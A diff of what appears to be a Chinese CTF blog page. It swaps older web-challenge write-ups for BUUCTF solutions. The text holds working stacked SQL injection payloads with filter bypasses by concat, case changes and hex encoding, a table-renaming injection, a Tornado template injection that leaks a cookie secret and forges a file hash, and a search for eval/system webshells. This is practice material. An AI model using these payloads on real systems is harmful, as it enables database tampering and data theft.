@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Summary of Web · laurel&#39;s note</title>
+    <title>BUUCTF-WEB · laurel&#39;s note</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >laurel&#39;s note.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Summary of Web</a>
+                <a href="#" class="post-name">BUUCTF-WEB</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Summary of Web
+            BUUCTF-WEB
             <!-- 404 -->
             
         </h1>
@@ -274,12 +274,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">1.3k</span>Reading time: <span class="post-count reading-time">5 min</span></span>
+                        <span>Word count: <span class="post-count word-count">1.2k</span>Reading time: <span class="post-count reading-time">5 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/08/29</span>
+                    <span class="post-intro-time">2019/09/06</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -403,108 +403,125 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h3 id="№-1-Fuzzing"><a href="#№-1-Fuzzing" class="headerlink" title="№.1 Fuzzing"></a>№.1 Fuzzing</h3><blockquote>
-<p>“百度杯”CTF比赛 十月场</p>
+        <h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><blockquote>
+<p>2019 强网杯</p>
 </blockquote>
-<p>题目内容是：there is nothing</p>
-<p>用Burpsuite抓包一下，能看到一个hint - -</p>
-<p><img src="/img/Summary-of-Web/1566477766113.png" alt="1566477766113"></p>
-<p>它要求要大的内部网络，专用IP地址段为：<a id="more"></a><br>10.0.0.0–10.255.255.255<br>172.16.0.0–172.31.255.255<br>192.168.0.0–192.168.255.255</p>
-<p>所以修改请求头，加上X-Forward-For，一个个试一下。</p>
-<p>当修改为X-Forwarded-For:10.10.10时，会得到一个新的提示Location。</p>
-<p><img src="/img/Summary-of-Web/1566477893134.png" alt="1566477893134"></p>
-<p>访问这个php地址，内容是：show me your key.</p>
-<p>那大概是要向服务器提交一个key的值吧，GET提交没反应，那就POST方式。</p>
-<p><img src="/img/Summary-of-Web/1566479859703.png" alt="1566479859703"></p>
-<p>告诉了密文，并且key在md5加密之前是icunqiu***，所以我们需要写一个脚本去找一下key：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">MD5 = <span class="string">"1b4167610ba3f2ac426a68488dbd89be"</span></span><br><span class="line">chars = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> chars:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> chars:</span><br><span class="line">            key = <span class="string">"ichunqiu"</span> + i + j + k</span><br><span class="line">            hash = hashlib.md5(key.encode()).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> hash == MD5:</span><br><span class="line">                print(key)</span><br><span class="line">                print(hash)</span><br></pre></td></tr></table></figure>
-
-<p>跑出来得到key为ichunqiu105 - -</p>
-<p><img src="/img/Summary-of-Web/1566478472878.png" alt="1566478472878"></p>
-<p>下一步，是一个新的php文件 - -</p>
-<p><img src="/img/Summary-of-Web/1566479915189.png" alt="1566479915189"></p>
-<p><img src="/img/Summary-of-Web/1566479970797.png" alt="1566479970797"></p>
-<p>来看一下sourcecode：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">authcode</span><span class="params">($string, $operation = <span class="string">'DECODE'</span>, $key = <span class="string">''</span>, $expiry = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">	$ckey_length = <span class="number">4</span>;</span><br><span class="line">	$key = md5($key ? $key : UC_KEY);</span><br><span class="line">	$keya = md5(substr($key, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">	$keyb = md5(substr($key, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">	$keyc = $ckey_length ? ($operation == <span class="string">'DECODE'</span> ? substr($string, <span class="number">0</span>, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : <span class="string">''</span>;</span><br><span class="line">	$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line">	$string = $operation == <span class="string">'DECODE'</span> ? base64_decode(substr($string, $ckey_length)) : sprintf(<span class="string">'%010d'</span>, $expiry ? $expiry + time() : <span class="number">0</span>) . substr(md5($string . $keyb), <span class="number">0</span>, <span class="number">16</span>) . $string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line">	$result = <span class="string">''</span>;</span><br><span class="line">	$box = range(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">	$rndkey = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> ($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> ($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">		$j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($operation == <span class="string">'DECODE'</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp; substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $keyc . str_replace(<span class="string">'='</span>, <span class="string">''</span>, base64_encode($result));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这是一个加密的方法，我们通过调用这个定义的方法去得到flag：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> authcode(<span class="string">"d116+lpzwYGeuOp97fQ8DbwUogjZvXwKdAMW1skwPQ6mU2kjOKC3b4bhsN7N9hq03qAfaAXEavDq5YxLilcpnCnuM5ClG8g"</span>,$operation = <span class="string">'DECODE'</span>, $key = <span class="string">'ichunqiu105'</span>, $expiry = <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
-
-<p>运行一下得到flag：</p>
-<p>flag{c1733e42-2c1c-481c-b49a-5b179dde9421}</p>
-<hr>
-<h3 id="№-2-Wanna-to-see-your-hat"><a href="#№-2-Wanna-to-see-your-hat" class="headerlink" title="№.2 Wanna to see your hat?"></a>№.2 Wanna to see your hat?</h3><blockquote>
-<p>2017年全国大学生信息安全竞赛</p>
-</blockquote>
-<p>首先是一个登录页面 - -</p>
-<p><img src="/img/Summary-of-Web/1566531195568.png" alt="1566531195568"></p>
-<p>随便创建一个账号然后登进去，然后有一大堆的 <strong>绿帽子</strong> …😶</p>
-<p><img src="/img/Summary-of-Web/1566531295743.png" alt="1566531295743"></p>
-<p>这个页面上，没看到啥有用的东西，返回到登录页面，抓个包看看 - -</p>
-<p><img src="/img/Summary-of-Web/1566531470440.png" alt="1566531470440"></p>
-<p>哇有个sql语句欸，尝试修改一下name值，发现它过滤了空格，并且把单引号(‘)转义成了反斜杠(\) - -</p>
-<p><img src="/img/Summary-of-Web/1566531626452.png" alt="1566531626452"></p>
-<p>但是没关系，空格可以被’/**/‘代替，并且如果把单引号放在payload的最后，那跟在后面的单引号就会被’/‘转义。</p>
-<p><img src="/img/Summary-of-Web/1566531964225.png" alt="1566531964225"></p>
-<p>发送后，可以看到多了一个’good job’，那应该是成功了，用这个payload去登录吧 - -</p>
-<p><img src="/img/Summary-of-Web/1566532188680.png" alt="1566532188680"></p>
-<hr>
-<h3 id="№-3-Hello-World"><a href="#№-3-Hello-World" class="headerlink" title="№.3 Hello World"></a>№.3 Hello World</h3><p>是一个Hello World界面 - -</p>
-<p><img src="/img/Summary-of-Web/1567066965022.png" alt="1567066965022"></p>
-<p>先看一下源码 - -</p>
-<p><img src="/img/Summary-of-Web/1567067003511.png" alt="1567067003511"></p>
-<p>访问一下flag.xmas.js，但是404了，尝试访问flag.js，有内容 - -</p>
-<p><img src="/img/Summary-of-Web/1567067074289.png" alt="1567067074289"></p>
-<p>有点东西，我甚至把js代码格式化分析了一下，但是太长了，我还是不会做…</p>
-<p>然鹅，题目的思路是.git泄露，.git/logs/HEAD文件的利用。如果用githack的话，会漏掉部分object - -</p>
-<p><img src="/img/Summary-of-Web/1567067185020.png" alt="1567067185020"></p>
-<p>改用gitextract，能提取出两个flag文件 - -</p>
-<p><img src="/img/Summary-of-Web/1567067300922.png" alt="1567067300922"></p>
-<p>这两个flag是不太一样的，用diff命令看一下不一样的地方 - -</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff flag.js flag.js.04bb09</span><br></pre></td></tr></table></figure>
-
-<p>可以看到前面不一样的地方拼起来是flag{ - -</p>
-<p><img src="/img/Summary-of-Web/1567067476771.png" alt="1567067476771"></p>
-<p>flag{82efc37f1cd5d4636ea7cadcd5a814a2}</p>
-<hr>
-<h3 id="№-4-Upload"><a href="#№-4-Upload" class="headerlink" title="№.4 Upload"></a>№.4 Upload</h3><blockquote>
-<p>今天开始做web题目，发现前面的都好难，中间的都做过了，就随便挑了一道，发现竟然是去年做过的题目，只是因为flag提交了不对所以没交flag…一年过去了，没有学过python的我还是这么菜，有点难过…我为什么这么菜呢，可能因为我不专心吧…</p>
-</blockquote>
-<p>题目内容是 - -<img src="/img/Summary-of-Web/1567173495060.png" alt="1567173495060"></p>
-<p>可以看到响应头这里有个flag - -<img src="/img/Summary-of-Web/1567173561188.png" alt="1567173561188"></p>
-<p>base64解码一下 - -</p>
-<p><img src="/img/Summary-of-Web/1567173627456.png" alt="1567173627456"></p>
-<p>并且每一次刷新页面，flag_is_here:后面的值都会变。需要写脚本读取页面的flag参数的值然后再把后面的值传过去，注意这个base64可以解两次。</p>
+<h4 id="解法一：堆叠注入"><a href="#解法一：堆叠注入" class="headerlink" title="解法一：堆叠注入"></a>解法一：堆叠注入</h4><p>/?inject=233’;show tables;#</p>
+<p>可以看到有两个表~</p>
+<p><img src="/img/BUUCTF-WEB/1567737495728.png" alt="1567737495728"></p>
 <blockquote>
-<p>去年省赛的一道题目和这个很像，都是需要解码两次base64，小白的我只解一次脚本半天跑不出来，难过死了，，今年比赛估计一如既往地难过…说白了就是窝太菜了。</p>
+<p>先介绍一下prepare语法：<br>PREPARE test from ‘我们的sql语句’;//预定义好sql<br>EXECUTE test (如果sql有参数的话, USING xxx,xxx); // (这里USING的只能是会话变量)执行预定义的sql<br>DEALLOCATE PREPARE test;//释放数据库连接</p>
 </blockquote>
-<p>这道题传的脚本内容如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64,requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    a = requests.session()</span><br><span class="line">    b = a.get(<span class="string">"http://1d244bd2e1664e07b80cc2b714ddc1c4a12576508f544c34.changame.ichunqiu.com/"</span>)</span><br><span class="line">    key1 = b.headers[<span class="string">"flag"</span>]</span><br><span class="line">    c = base64.b64decode(key1)</span><br><span class="line">    d = str(c).split(<span class="string">':'</span>)</span><br><span class="line">    key = base64.b64decode(d[<span class="number">1</span>])</span><br><span class="line">    body = &#123;<span class="string">"ichunqiu"</span>:key&#125;</span><br><span class="line">    f = a.post(<span class="string">"http://1d244bd2e1664e07b80cc2b714ddc1c4a12576508f544c34.changame.ichunqiu.com/"</span>,data=body)</span><br><span class="line">    <span class="keyword">print</span> (f.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>所以可以构造如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=233';<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br><span class="line"><span class="keyword">prepare</span> pay <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> pay;</span><br></pre></td></tr></table></figure>
 
-<p>跑完脚本会给个路径 - -</p>
-<p><img src="/img/Summary-of-Web/1567173906032.png" alt="1567173906032"></p>
-<p>进去看看 - -</p>
-<p><img src="/img/Summary-of-Web/1567173950524.png" alt="1567173950524"></p>
-<p>是一个login页面。扫描一下会发现有svn源码泄露，username在url.svn/wc.db里面 - -</p>
-<p><img src="/img/Summary-of-Web/1567174085010.png" alt="1567174085010"></p>
-<p>password随便。验证地方的意思验证码md5加密后前六位是ecd7c7，需要写脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(s).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>]  == str(s):</span><br><span class="line">            print(i)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main(<span class="string">"813e72"</span>)</span><br></pre></td></tr></table></figure>
+<p>页面返回内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure>
 
-<p>跑一会儿就能出来，给出了下一个路径 - -</p>
-<p><img src="/img/Summary-of-Web/1567174334789.png" alt="1567174334789"></p>
-<p>是一个文件上传，直接上传.pht文件就可以了 - -</p>
-<p><img src="/img/Summary-of-Web/1567175089728.png" alt="1567175089728"></p>
+<p>使用正则匹配过滤了以上关键字，并且大小写绕过是不行滴。那我们可以改成这样：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=233';<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prepare</span> pay <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> pay;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>concat()函数介绍：<br>用于将多个字符串连接成一个字符串。<br>mysql CONCAT(str1,str2,…)<br>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
+</blockquote>
+<p>页面返回内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, <span class="string">"set"</span>) &amp;&amp; strstr($inject, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>strstr()函数介绍：<br>用于查找字符串的首次出现<br>语法：strstr ( string <code>$haystack</code> , <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>$needle</code> [, bool <code>$before_needle</code> = <strong>FALSE</strong> ] ) : string<br>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p>
+<p>！该函数区分大小写。如果想要不区分大小写，请使用 <a href="https://www.php.net/manual/zh/function.stristr.php" target="_blank" rel="noopener">stristr()</a>。！</p>
+<p>区分大小写的意思是如果是小写的就不能判断出大写的。。。<br>该函数不能区分大小写，所以我们大写即可。<br>它不能区分大小写，所以使用它的时候是区分大小写的。。。<br>所以也就是：该函数区分大小写=该函数不能区分大小写。嗯很有道理。！</p>
+</blockquote>
+<p>所以对于这个检测，可以直接通过大写绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=233';<span class="keyword">sEt</span> @<span class="keyword">sql</span>=<span class="string">'se'</span>,<span class="string">'lect * from `1919810931114514`'</span>;</span><br><span class="line"><span class="keyword">prEpare</span> pay <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> pay;</span><br></pre></td></tr></table></figure>
+
+<p>然后就能看到flag啦~</p>
+<p><img src="/img/BUUCTF-WEB/1567736159943.png" alt="1567736159943"></p>
+<p>此外，还能采用hex编码的形式，在python2中~</p>
+<p><img src="/img/BUUCTF-WEB/1567736240567.png" alt="1567736240567"></p>
+<p>利用其构造的payload为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?inject=233';<span class="keyword">sEt</span> @<span class="keyword">sql</span>=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prEpare</span> pay <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> pay;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PS:空格换成+号，末尾加个#注释都🆗！~</p>
+</blockquote>
+<h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><blockquote>
+<p>参考赵师傅的博客：<a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">233</span><span class="string">';show columns from `1919810931114514`;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/BUUCTF-WEB/1567736840935.png" alt="1567736840935"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">233</span><span class="string">';show columns from words;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/BUUCTF-WEB/1567736893848.png" alt="1567736893848"></p>
+<p>接下来不太懂，咋就看粗来words表是默认查询的表了鸭…</p>
+<p>把191那个表改名为words，把flag列改为id列：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">233</span><span class="string">';RENAME TABLE `words` TO `words1`;</span></span><br><span class="line"><span class="string">RENAME TABLE `1919810931114514` TO `words`;</span></span><br><span class="line"><span class="string">ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span></span><br><span class="line"><span class="string">show columns from words;#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/BUUCTF-WEB/1567738654654.png" alt="1567738654654"></p>
+<p>再访问：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">233</span><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/BUUCTF-WEB/1567738677680.png" alt="1567738677680"></p>
+<p>太神奇了叭…</p>
 <hr>
-<center><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="450" height="86" src="//music.163.com/outchain/player?type=2&id=4988618&auto=1&height=66"></iframe>
-</center>
+<h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><blockquote>
+<p>2018 护网杯</p>
+</blockquote>
+<p>oj上的题做了一点点小改动鸭，三个文件内容如下：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>读取文件需要两个参数filename和filehash。其中，filehash=md5(cookie_secret+md5(filename))，但是headers里面并没有cookie值。那就只能谷歌一下tornado render什么的了。解法是在报错页面里模板注入。</p>
+<p>通过读取error?msg=可以得到：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'da53eb64-a805-4d4e-bdc2-fda1e66c587e'&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样cookie_secret就知道了，然后就是计算filehash了，下面提供两种脚本~</p>
+<p>PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"/fllllllllllllag"</span>;</span><br><span class="line">$a=md5($str);</span><br><span class="line">$str2 = <span class="string">"da53eb64-a805-4d4e-bdc2-fda1e66c587e"</span>;</span><br><span class="line">$str3=$str2.$a;</span><br><span class="line"><span class="keyword">echo</span> md5($str3);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>python代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">	md5 = hashlib.md5() </span><br><span class="line">	md5.update(s) </span><br><span class="line">	<span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sol</span><span class="params">()</span>:</span> </span><br><span class="line"> 	filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"> 	a =<span class="string">"da53eb64-a805-4d4e-bdc2-fda1e66c587e"</span></span><br><span class="line">	print(md5(a+md5(filename)))</span><br><span class="line"></span><br><span class="line">sol()</span><br></pre></td></tr></table></figure>
+
+<p>跑出来的hash值为 - -</p>
+<p><img src="/img/BUUCTF-WEB/1567757429756.png" alt="1567757429756"></p>
+<p>利用其访问就行了鸭~</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;filehash=75b7a43f3540e10cd317045514812aba</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="高明的黑阔"><a href="#高明的黑阔" class="headerlink" title="高明的黑阔"></a>高明的黑阔</h3><blockquote>
+<p>2019 强网杯</p>
+<p>参考wp：<a href="https://mochazz.github.io/2019/05/27/2019强网杯Web部分题解/#高明的黑客" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/27/2019强网杯Web部分题解/#高明的黑客</a></p>
+</blockquote>
+<p>这道题也真够猛的！!</p>
+<p><img src="/img/BUUCTF-WEB/1567768512837.png" alt="1567768512837"></p>
+<p>根据提示下载源码，给了一大堆混乱的文件，需要从这些文件中找能用的shell…</p>
+<p>写脚本批量扫描一下类似<code>eval($_GET[x])</code>或<code>system($_GET[x])</code>等shell。</p>
+<p>先进入该文件目录，使用PHP7.0以上版本开个端口，作为本地服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7.3 -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/BUUCTF-WEB/1567769481174.png" alt="1567769481174"></p>
+<blockquote>
+<p>话说这里，<br>-S 127.0.0.0:8000可以正常访问，<br>-S localhost:8000就不能访问，<br>什么鬼嗷😡</p>
+</blockquote>
+<p>访问localhost:8888，能够看到页面显示正常，就可以开始跑脚本啦 - -</p>
+<p><img src="/img/BUUCTF-WEB/1567769555902.png" alt="1567769555902"></p>
+<p>直接借用了这个nb师傅的脚本（tqltqltql~）：</p>
